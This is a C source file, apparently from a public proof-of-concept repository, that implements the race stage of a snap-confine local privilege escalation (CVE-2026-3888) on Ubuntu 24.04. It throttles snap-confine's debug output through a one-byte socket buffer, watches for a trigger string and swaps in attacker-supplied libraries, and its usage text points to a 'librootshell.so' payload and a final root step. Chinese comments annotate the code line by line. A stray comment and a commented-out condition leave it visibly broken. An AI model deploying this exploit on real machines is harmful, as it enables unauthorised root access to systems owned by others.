/*
 * firefox_2404.c - CVE-2026-3888 Race Helper
 *
 * https://raw.githubusercontent.com/nomaisthere/CVE-2026-3888/refs/heads/main/src/firefox_2404.c
 *
 * Build:
 *   gcc -O2 -static -o firefox_2404 firefox_2404.c
 *
 * Usage:
 *   Run from /tmp inside sandbox:
 *     ./firefox_2404 <payload.so>
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <errno.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/syscall.h>

/* snap-confine binary path 限制二进制文件路径 */
#define SNAP_CONFINE "/usr/lib/snapd/snap-confine"

/* 交换目录：比赛期间已交换（有效负载 <-> 真实库） */
#define EXCHANGE_SRC ".snap/usr/lib/x86_64-linux-gnu.exchange"    //SRC -- source -- 源
#define EXCHANGE_DST ".snap/usr/lib/x86_64-linux-gnu"             //DST -- destination -- 目的

/* 用于满足模拟阶段的真实库的来源 */
#define REAL_LIBDIR "/snap/core22/current/usr/lib/x86_64-linux-gnu"

/* 步骤 1（安全交换点）之后的调试输出标记 */
#define TRIGGER "dir:\"/tmp/.snap/usr/lib/x86_64-linux-gnu\""

static int copy_file(const char *src, const char *dst)    //static 这个函数只在“当前 .c 文件内部可见” | int 这个函数执行完会返回一个整数return 0;成功, return -1;失败 | char * = 字符指针 = 字符串 | const 指向的内容不能被修改
{
    char buf[65536];    //64KB 缓冲区
    ssize_t n;    //保存 read 返回值（读取了多少字节）
    int fds = open(src, O_RDONLY);    //只读打开源文件

    if (fds < 0)
        return-1;    //判断是否失败：open 失败返回 -1

    /* 0755 so snap-confine can read/execute the libraries */
    int fdd = open(dst, O_WRONLY | O_CREAT | O_TRUNC, 0755);    //只写，不存在就创建，存在就清空，  这些是库文件，需要可执行权限

    if (fdd < 0) {
        close(fds);
        return-1;    //关闭已经打开的源文件，防止 fd 泄漏
    }
    while ((n = read(fds, buf, sizeof(buf))) > 0)    //从源文件读取最多 64KB，n = read(...)：>0读到数据，0文件结束，-1出错
        write(fdd, buf, n);        //写入目标文件
    close(fds);    //int fds = open(src, O_RDONLY);
    close(fdd);    //int fdd = open(dst, O_WRONLY | O_CREAT | O_TRUNC, 0755);
    return 0;
}

/*
 *设置快照并交换数据（操作）
 *创建 .snap 布局，并将实际的库文件real libs填充到交换目录exchange dir中。
 */
static int setup_snap_and_exchange(const char *payload_so)
{
    mkdir(".snap", 0755);
    mkdir(".snap/usr", 0755);
    mkdir(".snap/usr/lib", 0755);
    mkdir(".snap/usr/local", 0755);
    mkdir(".snap/snap", 0755);
    mkdir(".snap/snap/firefox", 0755);

    /* Create expected firefox data-dir structure创建预期的 Firefox 数据目录结构 */
    DIR *d = opendir("/snap/firefox");        //d = “目录流”（目录句柄）,如果成功：d != NULL, 如果失败： d == NULL
    if (d) {
        struct dirent *ent;    //struct = 把多个不同类型的数据“打包在一起” ,struct变量 用法.  struct指针 用法-> | dirent目录里的“一个文件/子目录”,每个都会被读到 ent
        while ((ent = readdir(d)) != NULL) {        //readdir(d):返回下一个目录项
            if (ent->d_name[0] != '.' && strcmp(ent->d_name, "current") != 0) {        //ent->d_name:当前文件/目录的名字 //不是隐藏目录（不是 . 开头）//strcmp(a, b) 0相等 ≠0不相等，!= 0 表示 不等于 "current"
                char p[512];    //512字节的字符数组（字符串缓冲区）
                snprintf(p, sizeof(p), ".snap/snap/firefox/%s", ent->d_name);    //p输出缓冲区, ent->d_name替换 %s
                mkdir(p, 0755);
                snprintf(p, sizeof(p), ".snap/snap/firefox/%s/data-dir", ent->d_name);    //继续用同一个 p（覆盖旧内容）, snprintf限制最大长度 → 安全| sprintf(p, "...", ...)不检查长度 → 可能溢出
                mkdir(p, 0755);
            }
        }
        closedir(d);
    }

    /* 复制真实的库文件，以便模拟阶段成功（稍后替换 ld-linux） */  
    mkdir(EXCHANGE_SRC, 0755);    //创建一个目录：.exchange | 展开宏后是：mkdir(".snap/usr/lib/x86_64-linux-gnu.exchange", 0755);
    d = opendir(REAL_LIBDIR);    //打开目录 | 展开宏：d = opendir("/snap/core22/current/usr/lib/x86_64-linux-gnu");
    // if (!d) {    //错误判断
        perror("opendir real libdir");    //perror:打印错误信息
        return-1;    //函数执行失败，直接退出
    }    //opendir 打开一个目录，准备遍历它, 成功 指向目录的指针（DIR *） | 失败 NULL

    int count = 0;    //count → 统计处理了多少个文件/目录
    struct dirent *ent;    //ent → 当前读取到的目录项（指针）
    while ((ent = readdir(d)) != NULL) {    //ent = 当前目录里的一个文件/目录，d_name[1] = '\0'   ← 字符串结束符，
        if (ent->d_name[0] == '.' && (ent->d_name[1] == '\0' || (ent->d_name[1] == '.' && ent->d_name[2] == '\0')))    //ent->d_name[0] && 和 ent->d_name[1]情况1 || ent->d_name[1] ent->d_name[2]情况2
            continue;    //跳过当前循环（不处理），//"%s/%s":目录 + "/" + 文件名
        char src[4096];    //构造路径 
        char dst[4096];    
        snprintf(src, sizeof(src), "%s/%s", REAL_LIBDIR, ent->d_name);    //原始文件位置/snap/core22/current/usr/lib/x86_64-linux-gnu/xxx.so
        snprintf(dst, sizeof(dst), "%s/%s", EXCHANGE_SRC, ent->d_name);    //目标复制位置 .snap/usr/lib/x86_64-linux-gnu.exchange/xxx.so
        //这两个路径必须一一对应：REAL_LIBDIR/libc.so -> REAL_LIBDIR/libc.so 
        //对于每一个文件名： 构造它在原目录的位置（src）, 构造它在原目录的位置（src）
        //snprintf(...) 安全地拼接字符串（防止溢出）
        
        struct stat st;    //获取文件信息，stat跟随符号链接,看到的是 libc.so.6（真实文件）

        if (lstat(src, &st) < 0)    //lstat获取文件信息：文件类型、权限、大小等, lstat不跟随符号链接,看到的是 libc.so（链接本身）
            continue;    //用 lstat,可以知道：这个文件本身是不是符号链接
        if (S_ISDIR(st.st_mode)) {    //st.st_mode 文件类型 + 权限     判断类型 S_ISDIR是目录？
            mkdir(dst, 0755);
        } else if (S_ISLNK(st.st_mode)) {    /S_ISLNK/是符号链接？
            /* 保留符号链接，许多 .so 文件是链接到带版本名称的符号链接 */
            char link[4096];    //符号链接的行为：readlink + symlink
            ssize_t len = readlink(src, link, sizeof(link)-1);
                                         // sizeof(link)-1 ，最多读取多少字节，-1 是为了后面手动加 \0，，，readlink 不会自动加 '\0'
                                         //读取“符号链接指向哪里”，放进 link 这个字符串里，libc.so  →  libc.so.6，，，libc.so 只是一个“快捷方式”，真正的文件是 libc.so.6，，，不是复制文件内容！而是读取“它指向谁”
            if (len > 0) { link[len] = '\0'; symlink(link, dst); }    
        } else {
            copy_file(src, dst);
        }
        count++;
    }
    closedir(d);
    printf("[*] Exchange dir ready: %d entries in %s\n", count, EXCHANGE_SRC);
    return 0;
}

/*
 * create_stderr_socket()
 *
 * Creates a UNIX socket pair with minimal buffers (≈1 byte).
 *
 * Backpressure trick:
 *-snap-confine writes debug output to stderr (socket)
 *-Buffer fills almost immediately-> write() blocks
 *-Each read() by us frees 1 byte-> briefly unblocks it
 *
 * Result: we control execution byte-by-byte, effectively turning
 * a tiny race window into a controllable pause.
 */
static int create_stderr_socket(int *read_fd, int *write_fd)
{
    int sv[2];

    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) < 0) {
        perror("socketpair"); return-1;
    }
    /*
     * Set buffer sizes to 1 byte.
     * The kernel may round up to its minimum, but the effect is the same:
     * snap-confine blocks after writing just a few bytes.
     */
    int bufsize = 1;
    setsockopt(sv[0], SOL_SOCKET, SO_RCVBUF, &bufsize, sizeof(bufsize));
    setsockopt(sv[0], SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
    setsockopt(sv[1], SOL_SOCKET, SO_RCVBUF, &bufsize, sizeof(bufsize));
    setsockopt(sv[1], SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
    *read_fd = sv[0];
    *write_fd = sv[1];
    return 0;
}

/* 
 * run_and_race()
 * Main race logic:
 *-Creates the backpressure socket pair
 *-Read output byte-by-byte
 *-Detect trigger
 *-Swap directories
 */
static int run_and_race(void)
{
    int read_fd;
    int write_fd;
    if (create_stderr_socket(&read_fd, &write_fd) < 0)
        return-1;
    pid_t pid = fork();

    if (pid < 0) {
        perror("fork");
        return-1;
    }
    if (pid == 0) {
        /* Child: become snap-confine */
        close(read_fd);
        /* Redirect stderr to the write end of our backpressure socket */
        dup2(write_fd, STDERR_FILENO);
        close(write_fd);
        clearenv();
        /* Enable verbose debug output (used for trigger detection) */
        setenv("SNAPD_DEBUG", "1", 1);
        setenv("SNAP_INSTANCE_NAME", "firefox", 1);

        /*
        * Run snap-confine:
        *-write PID + perms for verification
        *-keep namespace alive
        */
        execl(SNAP_CONFINE, "snap-confine",
              "--base", "core22",
              "snap.firefox.hook.configure",
              "/bin/sh", "-c",
              "echo $$ > /tmp/race_pid.txt; "
              "stat-c '%U:%G %a' /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 "
              "> /tmp/race_perms.txt 2>&1; "
              "sleep 99994",
              NULL);
        _exit(1);
    }

    /* Parent: read snap-confine's output and watch for trigger */
    close(write_fd);
    /* Ring buffer to detect TRIGGER */
    char ringbuf[4096];
    int ringpos = 0;
    memset(ringbuf, 0, sizeof(ringbuf));
    int tlen = strlen(TRIGGER);
    char byte;
    ssize_t n;
    int swapped = 0;
    printf("[*] Reading snap-confine output (PID %d)...\n", pid);

    /* Read 1 byte-> briefly unblock writer-> regain control */
    while ((n = read(read_fd, &byte, 1)) > 0) {
        /* Echo snap-confine's output to stdout for visibility */
        write(STDOUT_FILENO, &byte, 1);

        /* Add byte to ring buffer */
        ringbuf[ringpos % sizeof(ringbuf)] = byte;
        ringpos++;

        /* Check for trigger once we have enough bytes */
        if (!swapped && ringpos >= tlen) {
            char check[512];
            for (int i = 0; i < tlen && i < (int)sizeof(check)-1; i++)
                check[i] = ringbuf[(ringpos-tlen + i) % sizeof(ringbuf)];
            check[tlen] = '\0';

            if (strstr(check, TRIGGER)) {
                printf("\n[!] TRIGGER DETECTED! Swapping .exchange...\n");

                /* Trigger hit: snap-confine paused after Step 1-> safe to swap */
                #ifndef RENAME_EXCHANGE
                #define RENAME_EXCHANGE (1 << 1)
                #endif
                if (syscall(SYS_renameat2, AT_FDCWD, EXCHANGE_DST,
                            AT_FDCWD, EXCHANGE_SRC, RENAME_EXCHANGE) == 0) {
                    /* Atomic swap succeeded */
                } else {
                    /* Fallback if renameat2 unavailable (non-atomic) */
                    rename(EXCHANGE_DST, ".snap/usr/lib/x86_64-linux-gnu.orig");
                    rename(EXCHANGE_SRC, EXCHANGE_DST);
                }

                swapped = 1;
                printf("[+] SWAP DONE! Race won.\n");
                printf("[*] Do NOT close this terminal.\n");
            }
        }
    }
    close(read_fd);
    int status;
    waitpid(pid, &status, 0);
    if (swapped)
        printf("[+] Race won! Our libraries are in the namespace.\n");
    else
        printf("[-] Trigger not detected. Race lost.\n");
    return swapped ? 0 :-1;
}

int main(int argc, char *argv[])
{
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <payload.so>\n", argv[0]);
        fprintf(stderr, "  payload.so: librootshell.so-the dynamic loader shellcode\n");
        return 1;
    }
    printf("[*] CVE-2026-3888-firefox 24.04 helper\n");
    printf("[*] Original research by Qualys (https://www.qualys.com)\n");
    printf("[*] CWD: ");
    fflush(stdout);
    system("pwd");
    printf("[*] Setting up .snap and .exchange directory...\n");

    if (setup_snap_and_exchange(argv[1]) < 0)
        return 1;
    printf("[*] Starting race against snap-confine...\n");
    if (run_and_race() < 0)
        return 1;
    printf("[+] Done. Proceed to Phase 4: overwrite ld-linux and trigger root.\n");
    return 0;
}
